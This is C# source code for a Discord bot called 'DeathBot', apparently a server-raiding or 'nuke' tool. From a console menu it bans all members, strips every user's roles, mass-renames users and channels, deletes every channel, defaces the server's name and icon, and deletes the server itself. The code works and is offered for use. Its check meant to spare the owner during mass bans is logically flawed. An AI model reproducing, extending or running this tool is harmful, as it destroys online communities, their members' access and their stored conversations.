using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;

namespace DeathBot
{
    class Bot
    {
        DiscordClient discord;
        CommandService commands;
        public Server[] servers;
        int serverid;
        Server curserver;
        string serverpref;
        string ownerid;

        public Bot(string token, string ownerId)
        {
            ownerid = ownerId;
            discord = new DiscordClient(x =>
            {
                x.LogLevel = LogSeverity.Info;
                x.LogHandler = log;
            });

            discord.ExecuteAndWait(async () =>
            {
                await discord.Connect(token, TokenType.Bot);
                System.Threading.Thread.Sleep(5000);
                getServers();
            });

        }

        private void getServers()
        {
            int i = 0;
            int count = discord.Servers.Count();
            Array.Resize(ref servers, count);
            Console.WriteLine(Environment.NewLine + Environment.NewLine);
            Console.WriteLine(count + " servers avalible.");
            Console.WriteLine("Select a server number to continue.");
            foreach (Server s in discord.Servers.Cast<Server>())
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(i);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(" | ");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(s.ToString());
                servers[i] = s;
                i++;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            serverid = Int32.Parse(Console.ReadLine());
            serverpref = servers[serverid].ToString();
            curserver = servers[serverid];
            command();
        }

        private void command()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-");
            cout("Append -a to use async.", p: ConsoleColor.Cyan);
            cout("Server");
            cout("  Pick a different server.", ConsoleColor.Green);
            cout("Permissions");
            cout("  Show bot's permissions and role position.", ConsoleColor.Green);
            cout("Strip roles [-a]");
            cout("  Strips all users from there roles, exept yourself and the bot.", ConsoleColor.Green);
            cout("nickname [-a]");
            cout(@"  Gives all users the nickname ""DeathBot_Rules""", ConsoleColor.Green);
            cout("Ban hammer [-a]");
            cout("  Bans all users and bots, exept yourself and the bot.", ConsoleColor.Green);
            cout("Delete");
            cout("  Delete the current server.", ConsoleColor.Green);
            cout("Delete Channels [-a]");
            cout("  Delete all the channels in the current server.", ConsoleColor.Green);
            cout("Edit");
            cout("  Edits the current server name, region, and icon.", ConsoleColor.Green);
            cout("Edit Channels [-a]");
            cout(@"  Edits all the channels in the current server to ""DeathBot Rules!""", ConsoleColor.Green);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-");
            
            bool cont = false;
            while (!cont)
            {
                string input = cin();
                switch (input.ToLower())
                {
                    case "server":
                        getServers();
                        cont = true;
                        break;
                    case "permissions":
                        getPerms();
                        break;
                    case "strip roles":
                        removeRoles();
                        break;
                    case "strip roles -a":
                        removeRoles(true);
                        break;
                    case "nickname":
                        nicknameall();
                        break;
                    case "nickname -a":
                        nicknameall(true);
                        break;
                    case "ban hammer":
                        banHammer();
                        break;
                    case "ban hammer -a":
                        banHammer(true);
                        break;
                    case "delete":
                        deleteserver();
                        break;
                    case "edit":
                        editserver();
                        break;
                    case "edit channels":
                        editchannels();
                        break;
                    case "edit channels -a":
                        editchannels(true);
                        break;
                    case "delete channels":
                        deletechannels();
                        break;
                    case "delete channels -a":
                        deletechannels(true);
                        break;
                    case "":
                        cout("");
                        break;
                    default:
                        cout("Invalid input.", ConsoleColor.Red);
                        break;
                }
                Console.ForegroundColor = ConsoleColor.Green;
            }
        }

        private void getPerms()
        {

            string roleName = "";
            string[] rolePerms = new string[13];
            int rolerank = -1;

            foreach (Role r in curserver.CurrentUser.Roles)
            {
                if (r.Position > rolerank)
                {
                    roleName = r.Name;
                    rolerank = r.Position;
                    rolePerms[0] = "Has Administrator : " + r.Permissions.Administrator.ToString();
                    rolePerms[1] = "Has Server Management Permissions : " + r.Permissions.ManageServer.ToString();
                    rolePerms[2] = "Has Channel Management Permissions : " + r.Permissions.ManageChannels.ToString();
                    rolePerms[3] = "Has Role Management Permissions : " + r.Permissions.ManageRoles.ToString();
                    rolePerms[4] = "Has Message Management Permissions : " + r.Permissions.ManageMessages.ToString();
                    rolePerms[5] = "Has Nickname Management Permissions : " + r.Permissions.ManageNicknames.ToString();
                    rolePerms[6] = "Has Ban Permissions : " + r.Permissions.BanMembers.ToString();
                    rolePerms[7] = "Has Kick Permissions : " + r.Permissions.KickMembers.ToString();
                    rolePerms[8] = "Has Deafen Permissions : " + r.Permissions.DeafenMembers.ToString();
                    rolePerms[9] = "Has Mute Members Permissions : " + r.Permissions.MuteMembers.ToString();
                    rolePerms[10] = "Has Upload Permissions : " + r.Permissions.AttachFiles.ToString();
                    rolePerms[11] = "Has Move Members Permissions : " + r.Permissions.MoveMembers.ToString();
                    rolePerms[12] = "Has Embeded link Permissions : " + r.Permissions.EmbedLinks.ToString();
                }

            }
            cout("Role name : " + roleName, p: ConsoleColor.Cyan);
            cout("Role position : " + rolerank, p: ConsoleColor.Cyan);
            foreach(string s in rolePerms)
            {
                int idx = s.LastIndexOf(' ');
                bool truee = Boolean.Parse(s.Substring(idx + 1));

                if (truee)
                {
                    cout(s, ConsoleColor.Green);
                }
                else
                {
                    cout(s, ConsoleColor.Red);
                }
            }
        }
        private async void nicknameall(bool async = false)
        {
            if (async)
            {
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    try
                    {
                        u.Edit(true, true, null, null, "DeathBot Rules!");
                    }
                    catch (Exception e)
                    {

                    }
                }
                cout("Done!", p: ConsoleColor.Green);
            }
            else
            {
                bool banned = false;
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    try
                    {
                        await u.Edit(true, true, null, null, "DeathBot Rules!");
                        banned = true;
                    }
                    catch (Exception e)
                    {
                        cout(e.Message + " for " + u.ToString(), ConsoleColor.Red, ConsoleColor.Red);
                        banned = false;
                    }
                    if (banned)
                    {
                        cout("Nick named " + u.Name, p: ConsoleColor.Green);
                    }

                }
            }
        }
        private async void removeRoles(bool async = false)
        {
            if (async)
            {
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    try
                    {
                        u.RemoveRoles(u.Roles.ToArray());
                    }
                    catch (Exception )
                    {

                    }
                }
                cout("Done!", p: ConsoleColor.Green);
            }
            else
            {
                bool changed = false;
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    try
                    {
                        await u.RemoveRoles(u.Roles.ToArray());
                        changed = true;
                    }
                    catch (Exception e)
                    {
                        cout(e.Message + " for " + u.ToString(), ConsoleColor.Red, ConsoleColor.Red);
                        changed = false;
                    }
                    if (changed)
                    {
                        cout("Stripped roles from " + u.Name, ConsoleColor.DarkMagenta, ConsoleColor.Green);
                    }

                }
            }
            
        }
        private async void editserver()
        {
            try
            {
                var _ioStream = new System.IO.StreamReader("rick-astley.jpg").BaseStream;
                await curserver.Edit(name: "DeathBot Rules!", region: "brazil", icon: _ioStream, iconType: ImageType.Jpeg);
            }
            catch(Exception e)
            {
                cout(e.Message, ConsoleColor.Red, ConsoleColor.Red);
                return;
            }
            cout("Server edited.", ConsoleColor.DarkMagenta, ConsoleColor.Green);

        }
        private async void banHammer(bool async = false)
        {
            if (async)
            {
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    if (u.Client != discord.CurrentUser.Client || u.Id.ToString() != ownerid)//u.Client != discord.CurrentUser.Client || u.Id.ToString() != ownerid)
                    {
                        try
                        {
                            curserver.Ban(u);
                        }
                        catch (Exception e)
                        {

                        }
                    }
                }
                cout("Done!", p: ConsoleColor.Green);
            }
            else
            {
                bool banned = false;
                foreach (User u in curserver.DefaultChannel.Users)
                {
                    if (u.Client != discord.CurrentUser.Client || u.Id.ToString() != ownerid)//u.Client != discord.CurrentUser.Client || u.Id.ToString() != ownerid)
                    {
                        try
                        {
                            await curserver.Ban(u);
                            banned = true;
                        }
                        catch (Exception e)
                        {
                            cout(e.Message + " for " + u.ToString(), ConsoleColor.Red, ConsoleColor.Red);
                            banned = false;
                        }
                        if (banned)
                        {
                            cout("Banned " + u.Name, ConsoleColor.DarkMagenta, ConsoleColor.Green);
                        }

                    }

                }
            }
            
        }
        private async void deleteserver()
        {
            try
            {
                await curserver.Delete();
            }
            catch(Exception e)
            {
                cout(e.Message, ConsoleColor.Red, ConsoleColor.Red);
                return;
            }
            cout("Server deleted.");
            getServers();
            
            
        }
        private async void editchannels(bool async = false)
        {
            if (async)
            {
                foreach (Channel c in curserver.AllChannels)
                {
                    try
                    {
                        c.Edit(name: "DeathBot_Rules", topic: "DeathBot_Rules");
                    }
                    catch (Exception e)
                    {

                    }
                }
                cout("Done!", p: ConsoleColor.Green);
            }
            else
            {
                bool edited = false;
                foreach (Channel c in curserver.AllChannels)
                {
                    try
                    {
                        await c.Edit(name: "DeathBot_Rules", topic: "DeathBot_Rules");
                        edited = true;
                    }
                    catch (Exception e)
                    {
                        cout(e.Message + "for channel " + c.Name, ConsoleColor.Red, ConsoleColor.Red);
                        edited = false;
                    }
                    if (edited)
                    {
                        cout("Channel edited.", ConsoleColor.DarkMagenta, ConsoleColor.Green);
                    }

                }
            }
            
        }
        private async void deletechannels(bool async = false)
        {
            if (async)
            {
                foreach (Channel c in curserver.AllChannels)
                {
                    try
                    {
                        c.Delete();
                    }
                    catch (Exception e)
                    {

                    }
                }
                cout("Done!", p: ConsoleColor.Green);
            }
            else
            {
                bool removed = false;
                foreach (Channel c in curserver.AllChannels)
                {
                    try
                    {
                        await c.Delete();
                        removed = true;
                    }
                    catch (Exception e)
                    {
                        cout(e.Message + "for channel " + c.Name, ConsoleColor.Red, ConsoleColor.Red);
                        removed = false;
                    }
                    if (removed)
                    {
                        cout("Removed channel " + c.Name, ConsoleColor.DarkMagenta, ConsoleColor.Green);
                    }
                }
            } 
        }

        
        private void log(object sender, LogMessageEventArgs e)
        {
            //Console.WriteLine(e.Message);
        }
        private void cout(string s, ConsoleColor c = ConsoleColor.DarkMagenta, ConsoleColor p = ConsoleColor.White)
        {
            int currentLineCursor = Console.CursorTop;
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.ForegroundColor = p;
            Console.Write(serverpref + " > ");
            Console.ForegroundColor = c;
            Console.WriteLine(s);
        }
        private string cin(ConsoleColor c = ConsoleColor.Green, ConsoleColor p = ConsoleColor.White)
        {
            Console.ForegroundColor = p;
            Console.Write(serverpref + " > ");
            Console.ForegroundColor = c;
            return Console.ReadLine();
        }
    }
}
